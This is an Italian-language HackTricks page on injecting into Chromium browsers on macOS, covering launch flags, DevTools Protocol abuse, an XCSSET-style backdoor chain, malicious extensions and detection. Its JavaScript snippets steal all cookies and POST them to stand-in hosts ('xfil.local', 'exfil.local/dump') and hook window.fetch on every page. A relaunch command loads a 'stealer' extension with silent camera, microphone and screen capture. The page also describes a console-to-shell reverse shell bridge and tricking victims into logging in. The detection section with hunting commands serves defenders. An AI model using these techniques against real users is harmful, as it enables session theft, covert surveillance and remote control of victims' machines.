# Chromium Injection su macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I browser basati su Chromium, come Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, utilizzano tutti gli stessi switch da riga di comando, file delle preferenze e interfacce di automazione DevTools. Su macOS, qualsiasi utente con accesso alla GUI può terminare una sessione browser esistente e riaprirla con flag arbitrari, estensioni o endpoint DevTools che vengono eseguiti con gli entitlement del target.

#### Avvio di Chromium con flag personalizzati su macOS

macOS mantiene una singola istanza UI per ogni profilo Chromium, quindi la strumentazione normalmente richiede la chiusura forzata del browser (ad esempio con `osascript -e 'tell application "Google Chrome" to quit'`). Gli attacker in genere riavviano il browser tramite `open -na "Google Chrome" --args <flags>` per poter iniettare argomenti senza modificare l'app bundle. Inserire questo comando all'interno di un LaunchAgent dell'utente (`~/Library/LaunchAgents/*.plist`) o di un login hook garantisce che il browser alterato venga riavviato dopo un reboot o un logoff.

#### Flag `--load-extension`

Il flag `--load-extension` carica automaticamente estensioni non impacchettate (percorsi separati da virgole). Usalo insieme a `--disable-extensions-except` per bloccare le estensioni legittime e forzare l'esecuzione esclusiva del payload. Le estensioni malevole possono richiedere permission ad alto impatto come `debugger`, `webRequest` e `cookies` per interagire con i protocolli DevTools, modificare gli header CSP, effettuare il downgrade di HTTPS o esfiltrare il materiale di sessione non appena il browser viene avviato.

#### Flag `--remote-debugging-port` / `--remote-debugging-pipe`

Questi switch espongono il Chrome DevTools Protocol (CDP) tramite TCP o pipe, consentendo agli strumenti esterni di controllare il browser. Google ha osservato un abuso diffuso di questa interfaccia da parte degli infostealer e, a partire da Chrome 136 (marzo 2025), gli switch vengono ignorati per il profilo predefinito, a meno che il browser non venga avviato con un `--user-data-dir` non standard. Questo applica l'App-Bound Encryption ai profili reali, ma gli attacker possono comunque creare un profilo nuovo, indurre la vittima ad autenticarsi al suo interno (con phishing/triage assistance) e raccogliere cookie, token, stati di attendibilità del dispositivo o registrazioni WebAuthn tramite CDP.

#### Flag `--user-data-dir`

Questo flag reindirizza l'intero profilo del browser (History, Cookies, Login Data, file delle preferenze, ecc.) verso un percorso controllato dall'attacker. È obbligatorio quando si combinano build moderne di Chrome con `--remote-debugging-port` e mantiene inoltre il profilo alterato isolato, consentendo di inserire file `Preferences` o `Secure Preferences` preconfigurati che disabilitano i prompt di sicurezza, installano automaticamente estensioni e modificano gli schemi predefiniti.

#### Flag `--use-fake-ui-for-media-stream`

Questo switch bypassa il prompt di autorizzazione per fotocamera e microfono, consentendo a qualsiasi pagina che chiami `getUserMedia` di ottenere immediatamente l'accesso. Può essere combinato con flag come `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o comandi CDP `Browser.grantPermissions` per catturare silenziosamente audio/video, condividere lo schermo o soddisfare i controlli delle permission WebRTC senza interazione dell'utente.

## Pattern di Delivery e Riavvio osservati in the Wild

L'abuso di CDP è comunemente una fase di **post-exploitation**, piuttosto che il payload iniziale. Una recente campagna macOS mirata agli sviluppatori ha utilizzato una fase di build Xcode **`Run Script`** avvelenata (`PBXShellScriptBuildPhase`), in modo che il codice venisse eseguito solo quando la vittima **compilava** il progetto, non quando lo clonava o lo apriva semplicemente. Dopo la prima esecuzione, il malware ha inoltre infettato altri alberi `.xcodeproj`, aggiunto hook Git `pre-commit` malevoli e cercato altri progetti Xcode negli archivi ZIP.

Per l'abuso di Chromium questo è importante perché l'attacker non deve applicare patch direttamente al browser binary. Uno stager di breve durata nella build phase / `osascript` può invece installare un **browser wrapper** (LaunchAgent, login item, voce nel Dock, app launcher trojanizzato, ecc.) che riapre il browser legittimo con flag controllati dall'attacker ogni volta che l'utente lo avvia.

> [!TIP]
> Sugli endpoint degli sviluppatori, controlla i file `.pbxproj`, `.git/hooks/pre-commit` e gli ZIP contenenti `.xcodeproj` alla ricerca di `curl`, `osascript`, `xxd`, `base64` annidato o logica inattesa per il riavvio di Chrome.

## Abuso del Remote Debugging e del DevTools Protocol

Una volta riavviato Chrome con un `--user-data-dir` dedicato e `--remote-debugging-port`, è possibile collegarsi tramite CDP (ad esempio attraverso `chrome-remote-interface`, `puppeteer` o `playwright`) e automatizzare workflow con privilegi elevati:

- **Furto di cookie/sessioni:** `Network.getAllCookies` e `Storage.getCookies` restituiscono valori HttpOnly anche quando l'App-Bound encryption normalmente bloccherebbe l'accesso al filesystem, perché CDP chiede al browser in esecuzione di decrittografarli.
- **Manomissione delle permission:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` consentono di bypassare i prompt per fotocamera e microfono (soprattutto se combinati con `--use-fake-ui-for-media-stream`) o di falsificare i controlli di sicurezza basati sulla posizione.
- **Iniezione di keystroke/script:** `Runtime.evaluate` esegue JavaScript arbitrario nella tab attiva, consentendo il furto di credenziali, la modifica del DOM o l'iniezione di beacon di persistenza che sopravvivono alla navigazione.
- **Esfiltrazione live:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` intercettano richieste e risposte autenticate in tempo reale senza toccare gli artefatti su disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Poiché Chrome 136 blocca CDP sul profilo predefinito, copiare la directory esistente `~/Library/Application Support/Google/Chrome` della vittima in un percorso di staging non consente più di ottenere cookie decrittografati. In alternativa, fai autenticare l'utente tramite social engineering all'interno del profilo strumentato, ad esempio durante una sessione di supporto "utile", oppure cattura i token MFA in transito tramite hook di rete controllati da CDP.

### XCSSET-style CDP Backdoor Chain

Un pattern malware pratico consiste nel:

1. Riavviare l'impianto o il wrapper userland ogni volta che Chrome viene avviato.
2. Avviare il browser legittimo con `--remote-debugging-port=<port>` e, su Chrome 136+, generalmente anche con un `--user-data-dir=<dir>` non predefinito.
3. Avviare un helper che si connette al WebSocket CDP locale e registra un pre-document hook con `Page.addScriptToEvaluateOnNewDocument`.

Questo helper può iniettare JavaScript **prima** dell'esecuzione del codice del sito, una caratteristica ideale per eseguire hooking di `window.fetch`, `XMLHttpRequest`, wallet provider o flussi di autofill senza modificare i file su disco.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Una variante più potente trasforma il browser in un **host command bridge**: il JavaScript iniettato emette un `console.log` con un delimitatore, l'helper locale monitora `Runtime.consoleAPICalled`, rimuove il marker, esegue il testo rimanente tramite la shell dell'host (ad esempio `exec.Command` di Go) e restituisce stdout/stderr tramite il WebSocket dell'attaccante. Questo trasforma l'esecuzione di script a livello di tab in una reverse shell quasi fileless.

## Injection basata su Extension tramite Debugger API

La ricerca del 2023 "Chrowned by an Extension" ha dimostrato che una malicious extension che utilizza l'API `chrome.debugger` può collegarsi a qualsiasi tab e ottenere gli stessi poteri DevTools di `--remote-debugging-port`. Questo infrange le ipotesi originali di isolamento (le extension rimangono nel proprio contesto) e consente:

- Il furto silenzioso di cookie e credenziali tramite `Network.getAllCookies`/`Fetch.getResponseBody`.
- La modifica dei permessi dei siti (camera, microfono, geolocalizzazione) e il bypass degli interstitial di sicurezza, permettendo alle pagine di phishing di impersonare i dialoghi di Chrome.
- La manomissione on-path degli avvisi TLS, dei download o dei prompt WebAuthn pilotando programmaticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carica l'extension con `--load-extension`/`--disable-extensions-except` in modo da non richiedere alcuna interazione dell'utente. Uno script di background minimale che weaponizes l'API è il seguente:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'estensione può anche sottoscriversi agli eventi `Debugger.paused` per leggere le variabili JavaScript, modificare gli script inline o inserire breakpoint personalizzati che persistono durante la navigazione. Poiché tutto viene eseguito all'interno della sessione GUI dell'utente, Gatekeeper e TCC non vengono attivati, rendendo questa tecnica ideale per malware che ha già ottenuto l'esecuzione nel contesto dell'utente.

## Rilevamento e Hunting

- Generare un alert sui browser Chromium avviati con `--remote-debugging-port`, `--remote-debugging-pipe` o un `--user-data-dir` sospetto, soprattutto quando il processo padre è `bash`, `sh`, `osascript`, `xcodebuild` o un helper LaunchAgent.
- Cercare catene brevi in cui un helper apre un WebSocket CDP locale, registra `Page.addScriptToEvaluateOnNewDocument` e quindi stabilisce una connessione WebSocket/HTTPS outbound di lunga durata.
- Cercare bridge console-to-shell correlando l'attività `Runtime.consoleAPICalled` del browser con shell figlie o processi helper che eseguono comandi forniti dall'attacker.
- Sui Mac degli sviluppatori, esaminare le voci `PBXShellScriptBuildPhase` nei file `.pbxproj`, gli hook Git `pre-commit`, i relauncher del Dock/login item e i progetti Xcode contenuti in ZIP alla ricerca dell'installazione di browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Strumenti

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automates Chromium launches with payload extensions and exposes interactive CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Similar tooling focused on traffic interception and browser instrumentation for macOS operators.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library to script Chrome DevTools Protocol dumps (cookies, DOM, permissions) once a `--remote-debugging-port` instance is live.

### Esempio
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trova altri esempi nei link degli strumenti.

## Riferimenti

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
